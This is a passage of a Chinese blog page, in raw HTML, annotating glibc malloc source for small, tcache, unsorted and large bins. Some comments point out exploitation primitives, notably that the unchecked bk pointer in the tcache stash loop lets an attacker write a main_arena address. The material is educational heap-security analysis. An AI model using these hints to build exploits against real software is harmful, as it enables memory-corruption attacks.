函数将 fast bins 中的 chunk 合并。</span></span><br><span class="line">    <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">      malloc_consolidate(av);</span><br><span class="line">    <span class="comment">//否则说明有合适的 chunk 在对应的 bin 链，将 victim 从 small bin 的双向循环链表中取出，设置 victim chunk 的 inuse 标志，该标志处于 victim chunk 的下一个相邻 chunk 的 size 字段的第一个 bit。从 small bin 中取出 victim 也可以用 unlink() 宏函数，只是这里没有使用。</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">      <span class="comment">//经典的通过检查 victim 的 bck 的 fd 指针是否指向 victim，来确定链表是否有被破坏。</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//脱链。</span></span><br><span class="line">      set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line">        </span><br><span class="line">      <span class="comment">//接着判断当前分配区是否为非主分配区，如果是，将 victim chunk 的 size 字段中的表示非主分配区的标志 bit 清零，最后调用 chunk2mem() 函数获得 chunk 的实际可用的内存指针，将该内存指针返回给应用层。</span></span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">      check_malloced_chunk(av, victim, nb);</span><br><span class="line">      <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">      alloc_perturb(p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h5 id="tcache-1">tcache</h5>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">      <span class="comment">//victim就是要脱链的堆块，也就是small bin里的最后一个</span></span><br><span class="line">      <span class="comment">//这个if在判断我们所需要的size的那条small bin链上是否存在堆块，存在的话就把victim给脱链</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<span class="comment">//对small bin的双向链表的完整性做了检查，确保victim-&gt;bk-&gt;fd指向的还是victim</span></span><br><span class="line">    <span class="comment">//如果我们在这里劫持了victim的bk指针，就会导致bck的fd指向的并不是victim，从而触发异常</span></span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);<span class="comment">//设置下一个（高地址）chunk的prev_inuse位</span></span><br><span class="line">          bin-&gt;bk = bck;<span class="comment">//将victim脱链</span></span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="type">size_t</span> tc_idx = csize2tidx (nb);<span class="comment">//获取size对应的tcache索引</span></span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<span class="comment">//如果这个索引在tcache bin的范围里，也就是这个size属于tcache bin的范围</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<span class="comment">//如果tcache bin没有满</span></span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)<span class="comment">//如果small bin不为空,tc_victim为small bin中的最后一个堆块</span></span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;<span class="comment">//这里取tc_victim的bk指针，并没有针对bck做双向链表完整性检查，因此我们可以去攻击tc_victim的bk指针</span></span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;<span class="comment">//将tc_victim从small bin中脱链</span></span><br><span class="line">		      bck-&gt;fd = bin;<span class="comment">//如果我们伪造bck，这里就可以将bck-&gt;fd的位置写入一个bin的地址(main_arena+96)</span></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);<span class="comment">//将tc_victim链入tc_idx这条链</span></span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">   While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">   even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">   fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">   Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">   large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">   invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">   it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  idx = largebin_index(nb);</span><br><span class="line">  <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Process recently freed or remaindered chunks, taking one only if</span></span><br><span class="line"><span class="comment">     it is exact fit, or, if this a small request, the chunk is remainder from</span></span><br><span class="line"><span class="comment">     the most recent non-exact fit.  Place other traversed chunks in</span></span><br><span class="line"><span class="comment">     bins.  Note that this step is the only place in any routine where</span></span><br><span class="line"><span class="comment">     chunks are placed in bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The outer loop here is needed because we might not realize until</span></span><br><span class="line"><span class="comment">     near the end of malloc that we should have consolidated, so must</span></span><br><span class="line"><span class="comment">     do so and retry. This happens at most once, and only when we would</span></span><br><span class="line"><span class="comment">     otherwise need to expand memory to service a &quot;small&quot; request.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//反向遍历 unsorted bin 的双向循环链表，遍历结束的条件是循环链表中只剩下一个头结点。</span></span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//检查当前遍历的 chunk 是否合法。 </span></span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect(victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect(victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr(check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                        chunk2mem(victim), av);</span><br><span class="line">      size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">         only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">         runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">         exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">         no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">//1.如果需要分配一个 small bin chunk，且 unsorted bin 中只有一个 chunk，且这个 chunk 为 last remainder chunk，且这个 chunk 的大小大于所需 chunk 的大小加上 MINSIZE，在满足这些条件的情况下，可以使用这个chunk切分出需要的small bin chunk。</span></span><br><span class="line">      <span class="comment">//这是唯一的从 unsorted bin 中分配出 small bin chunk 的情况，这种优化利于 cpu 的高速缓存命中。</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(nb) &amp;&amp;</span><br><span class="line">          bck == unsorted_chunks(av) &amp;&amp;</span><br><span class="line">          victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">          (<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">        <span class="comment">//切割这个 chunk。</span></span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        remainder = chunk_at_offset(victim, nb);</span><br><span class="line">        unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;</span><br><span class="line">        av-&gt;last_remainder = remainder;</span><br><span class="line">        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(remainder_size))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置被分割出去的 chunk 和 剩下的 last remainder chunk 的信息。</span></span><br><span class="line">        set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                             (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        set_foot(remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//将当前遍历的 chunk 脱链。</span></span><br><span class="line">      <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">      unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">//2.若当前遍历的 chunk 的 size 与 nb 一致，设置物理相邻的下一个堆块的 pre_inuse 位，返回指针，结束分配。</span></span><br><span class="line">      <span class="keyword">if</span> (size == nb)</span><br><span class="line">      &#123;</span><br><span class="line">        set_inuse_bit_at_offset(victim, size);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">          victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">//3.如果当前遍历的 chunk 属于 small bins，那就将它链入 small bins。</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(size))</span><br><span class="line">      &#123;</span><br><span class="line">        victim_index = smallbin_index(size);</span><br><span class="line">        bck = bin_at(av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">//4.如果当前遍历的 chunk 属于 large bins，那就将它链入 large bins。</span></span><br><span class="line">        victim_index = largebin_index(size);</span><br><span class="line">        bck = bin_at(av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">        <span class="comment">//当 large bin 链中存在 bins 时，要将该 chunk 链入合适的位置。</span></span><br><span class="line">        <span class="comment">//从这段源码就可以看出来一个 chunk 存在于两个双向循环链表中，一个链表包含了 large bin 中所有的 chunk，另一个链表为 chunk size 链表，该链表从每个相同大小的 chunk 的取出第一个 chunk 按照大小顺序链接在一起，便于一次跨域多个相同大小的 chunk 遍历下一个不同大小的 chunk，这样可以加快在 large bin 链表中的遍历速度。</span></span><br><span class="line">        <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">          size |= PREV_INUSE;</span><br><span class="line">          <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">          assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>)(bck-&gt;bk-&gt;size))</span><br><span class="line">          &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">//正向遍历 chunk size 链表，直到在链中找到第一个大小小于等于当前 chunk 大小的块。</span></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>)size &lt; fwd-&gt;size)</span><br><span class="line">            &#123;</span><br><span class="line">              fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">                 </span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)size == (<span class="type">unsigned</span> <span class="type">long</span>)fwd-&gt;size)</span><br><span class="line">              <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">              fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//当 large bin 链中没有 bins 时，直接将该 chunk 入链。</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      mark_bin(av, victim_index);</span><br><span class="line">      victim-&gt;bk = bck;</span><br><span class="line">      victim-&gt;fd = fwd;</span><br><span class="line">      fwd-&gt;bk = victim;</span><br><span class="line">      bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//如果 unsorted bin 中的 chunk 超过了 10000 个，最多遍历 10000 个就退出，避免长时间处理 unsorted bin 影响内存分配的效率。</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS 10000</span></span><br><span class="line">      <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">      sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//如果所需分配的 chunk 为 large bin chunk，查询对应的 large bin 链表，如果 large bin 链表为空，或者链表中最大的 chunk 也不能满足要求，则不能从 large bin 中分配。否则，遍历 large bin 链表，找到合适的 chunk。</span></span><br><span class="line">   <span class="keyword">if</span> (!in_smallbin_range(nb))</span><br><span class="line">   &#123;</span><br><span class="line">     bin = bin_at(av, idx);</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">     <span class="keyword">if</span> ((victim = first(bin)) != bin &amp;&amp;</span><br><span class="line">         (<span class="type">unsigned</span> <span class="type">long</span>)(victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb))</span><br><span class="line">     &#123;</span><br><span class="line">       victim = victim-&gt;bk_nextsize;</span><br><span class="line">       <span class="comment">//反向遍历 chunk size 链表，直到找到第一个大于等于所需 chunk 大小的 chunk 退出循环。</span></span><br><span class="line">       <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>)(size = chunksize(victim)) &lt;</span><br><span class="line">               (<span class="type">unsigned</span> <span class="type">long</span>)(nb)))</span><br><span class="line">         victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">          list does not have to be rerouted.  */</span></span><br><span class="line">       <span class="comment">//如果从 large bin 链表中选取的 chunk victim 不是链表中的最后一个 chunk，并且与 victim 大小相同的chunk不止一个，那么意味着 victim 为 chunk size 链表中的节点，为了不调整 chunk size 链表，需要避免将 chunk size 链表中的节点取出，所以取 victim-&gt;fd 节点对应的 chunk 作为候选 chunk。由于 large bin 链表中的 chunk 也是按大小排序，同一大小的 chunk 有多个时，这些 chunk 必定排在一起，所以 victim-&gt;fd 节点对应的 chunk 的大小必定与 victim 的大小一样。</span></span><br><span class="line">       <span class="comment">//这样脱链的就变成了 victim 的下一个同样大小的堆块了，减少了工作量，因为不用去修改 chunk size 链表。</span></span><br><span class="line">       <span class="keyword">if</span> (victim != last(bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">         victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//计算将 victim 切分后剩余大小，并调用 unlink() 宏函数将 victim 从 large bin 链表中取出。</span></span><br><span class="line">       remainder_size = size - nb;</span><br><span class="line">       unlink(av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//5.1.如果将 victim 切分后剩余大小小于 MINSIZE，则将整个 victim 分配出去。</span></span><br><span class="line">       <span class="comment">/* Exhaust */</span></span><br><span class="line">       <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">       &#123;</span><br><span class="line">         set_inuse_bit_at_offset(victim, size);</span><br><span class="line">         <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">           victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">       &#125;</span><br><span class="line">         </span><br><span class="line">       <span class="comment">//5.2.从 victim 中切分出所需的 chunk，剩余部分作为一个新的 chunk 加入到 unsorted bin 中。如果剩余部分 chunk 属于 large bins，将剩余部分 chunk 的 chunk size 链表指针设置为 NULL，因为 unsorted bin 中的 chunk 是不排序的，这两个指针无用，必须清零。</span></span><br><span class="line">       <span class="comment">//划重点了，这里被切割了的 chunk 剩余部分会进入 unsorted bin 链中。</span></span><br><span class="line">       <span class="comment">/* Split */</span></span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">         remainder = chunk_at_offset(victim, nb);</span><br><span class="line">         <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">            have to perform a complete insert here.  */</span></span><br><span class="line">         bck = unsorted_chunks(av);</span><br><span class="line">         fwd = bck-&gt;fd;</span><br><span class="line">         <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">         &#123;</span><br><span class="line">           errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">           <span class="keyword">goto</span> errout;</span><br><span class="line">         &#125;</span><br><span class="line">         remainder-&gt;bk = bck;</span><br><span class="line">         remainder-&gt;fd = fwd;</span><br><span class="line">         bck-&gt;fd = remainder;</span><br><span class="line">         fwd-&gt;bk = remainder;</span><br><span class="line">         <span class="keyword">if</span> (!in_smallbin_range(remainder_size))</span><br><span class="line">         &#123;</span><br><span class="line">           remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">           remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                              (av != 